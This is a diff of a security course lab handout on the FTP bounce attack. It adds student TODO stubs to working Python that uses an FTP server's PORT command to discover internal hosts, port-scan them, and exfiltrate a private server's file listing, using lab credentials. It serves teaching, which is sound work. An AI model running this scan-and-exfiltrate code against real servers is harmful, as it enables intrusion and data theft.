@@ -21,7 +21,6 @@ Task 2: Discover hosts on the internal network
 ::
 
     import sys, os
-    sys.path.append(os.path.dirname(os.path.abspath(__file__)) + "/..")
     from cp_ftp import FTP
 
     # List of discovered host IP addresses.
@@ -32,9 +31,17 @@ Task 2: Discover hosts on the internal network
       ftp = FTP("192.168.56.101", debug=False)
       ftp.send_login_commands("student", "golyeeHug6")
 
-      # Send a PORT command pointing to port 22 on this target.
       host = "192.168.56.%d" % last_octet
       target_address = (host, 22)
+
+      ################################################################################
+      # STUDENT TODO 1: Send a PORT command for target_address. Then send data to it.
+      # Hint: the provided examples/remote_port.py will be useful.
+      # Important: if a port is open then run:
+      #   hosts_ports[host].append(port)
+      ################################################################################
+
+      # Send a PORT command pointing to port 22 on this target.
       ftp.send_port_command(target_address)
       # If the PORT command was somehow invalid, skip this target.
       response = ftp.recv_response()
@@ -63,39 +70,51 @@ Task 3: Port scan discovered hosts
 ::
 
     import sys, os
-    sys.path.append(os.path.dirname(os.path.abspath(__file__)) + "/..")
     from cp_ftp import FTP
 
     # List of discovered host IP addresses.
-    hosts = []
+    hosts = ["192.168.56.102", "192.168.56.103"]
+    hosts_ports = {}
 
-    for port in range(1, 65536):
-      # Make a new FTP connection each time for simplicity.
-      ftp = FTP("192.168.56.101", debug=False)
-      ftp.send_login_commands("student", "golyeeHug6")
+    for host in hosts:
+      hosts_ports[host] = []
 
-      # Send a PORT command pointing to target port on target host.
-      target_address = ("192.168.56.101", port)
-      ftp.send_port_command(target_address)
-      # If the PORT command was somehow invalid, skip this host.
-      response = ftp.recv_response()
-      if response.code != 200:
-        print(response)
-        continue
+      for port in range(1, 1024):
+        # Make a new FTP connection each time for simplicity.
+        ftp = FTP("192.168.56.101", debug=False)
+        ftp.send_login_commands("student", "golyeeHug6")
 
-      # Try sending file LIST output to target on chosen port.
-      ftp.send_command("LIST")
-      response = ftp.recv_response()
-      print(target_address, response)
+        target_address = (host, port)
 
-      # Success is indicated by this response:
-      #   150 Opening ASCII mode data connection for file list
-      if response.code == 150:
-        hosts.append(target_address)
+        ################################################################################
+        # STUDENT TODO 1: Send a PORT command for target_address. Then send data to it.
+        # Hint: the provided examples/remote_port.py will be useful.
+        # Important: if a port is open then run:
+        #   hosts_ports[host].append(port)
+        ################################################################################
 
-      ftp.close()
+        # Send a PORT command pointing to target port on target host.
+        ftp.send_port_command(target_address)
+        # If the PORT command was somehow invalid, skip this host.
+        response = ftp.recv_response()
+        if response.code != 200:
+          print(response)
+          continue
 
-    print(hosts)
+        # Try sending file LIST output to target on chosen port.
+        ftp.send_command("LIST")
+        response = ftp.recv_response()
+        print(target_address, response)
+
+        # Success is indicated by this response:
+        #   150 Opening ASCII mode data connection for file list
+        if response.code == 150:
+          hosts_ports[host].append(port)
+
+        ftp.close()
+
+    for host in hosts:
+      print("%s has ports %s open." % (host, ", ".join(map(str, hosts_ports[host]))))
 
 ************************************************************
 Extension Task: Exfiltrate data from a private FTP server
@@ -104,13 +123,14 @@ Extension Task: Exfiltrate data from a private FTP server
 ::
 
     import sys, os
-    sys.path.append(os.path.dirname(os.path.abspath(__file__)) + "/..")
     from cp_ftp import FTP
 
     ftp = FTP("192.168.56.101", debug=True)
     ftp.send_login_commands("student", "golyeeHug6")
 
+    ################################################################################
     # Build a script to get a LIST of files on the private server.
+    ################################################################################
 
     # 1. Commands to log in.
     login_commands = ftp.get_login_commands("student", "golyeeHug6")
@@ -130,7 +150,10 @@ Extension Task: Exfiltrate data from a private FTP server
     exploit_file = "exploit.txt"
     file_contents = "\r\n".join(exploit_commands) + "\0" * 1000000
 
-    # Upload the script to the server.
+    ################################################################################
+    # STUDENT TODO 1: Upload the script to the server.
+    # Hint: the provided examples/stor.py will be useful.
+    ################################################################################
 
     # 1. Set the PORT to send data upon.
     data_address = ftp.new_data_address()
@@ -154,7 +177,15 @@ Extension Task: Exfiltrate data from a private FTP server
       print(response)
       sys.exit(1)
 
-    # Have the server send the script to the private server.
+    ################################################################################
+    # STUDENT TODO 2: Have the server send the script to the private server.
+    # Hint: the provided examples/remote_port.py will be useful.
+    # Hint: unlike in that example, we *are* recieving data inbetween the two data
+    #       transfer status responses.
+    # Hint: you need to get data from the same port as exfiltration_data_address.
+    #       ftp.new_data_address(port=exfiltration_data_address[1])
+    #       print("EXFILTRATED DATA: %s" % ftp.recv_data())
+    ################################################################################
 
     # 1. Tell server it can open Data Connection to private server's FTP Command port.
     target_address = ("192.168.56.103", 21)
@@ -172,7 +203,7 @@ Extension Task: Exfiltrate data from a private FTP server
       sys.exit(1)
 
     # 3. Rebind to the exfilitration port chosen earlier and read LIST of private files from it.
-    ftp.new_data_address(exfiltration_data_address[1])
+    ftp.new_data_address(port=exfiltration_data_address[1])
     print("********* [EXFILTRATED DATA BEGINS] *********")
     ftp.recv_data()
     print("********* [EXFILTRATED DATA ENDS] *********")
@@ -184,4 +215,3 @@ Extension Task: Exfiltrate data from a private FTP server
       sys.exit(1)
 
     ftp.close()
-
